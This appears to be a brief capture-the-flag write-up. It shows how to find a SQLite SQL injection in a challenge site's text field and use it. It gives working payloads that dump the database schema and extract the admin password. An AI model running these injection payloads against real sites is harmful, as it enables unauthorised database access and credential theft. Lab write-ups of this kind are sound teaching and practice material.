# share the ideas

1. Access the target website and create an account.

2. In the text field, enter a test value like:

   ```
   hhh
   ```

3. Then try adding a single quote to check for SQL errors:

   ```
   hhh'
   ```

   The response shows:

   ```
   Error : HY000 1 unrecognized token: "'hhh'')"
   ```

   This indicates a SQLite syntax error, confirming possible SQL injection.

4. To reveal the database schema, use:

   ```
   hhh' || (SELECT sql FROM sqlite_master))--
   ```

   Output:

   `
   "hhhCREATE TABLE "xde43_users" ( "id" int(10) NOT NULL, "name" varchar(255) NOT NULL, "email" varchar(255) NOT NULL, "password" varchar(255) NOT NULL, "role" varchar(100) DEFAULT NULL )"
   `

5. To retrieve the admin password:

   ```
   hhh' || (SELECT password FROM xde43_users WHERE role='admin'))--
   ```

6. Submit the password as flag and solve the challenge.
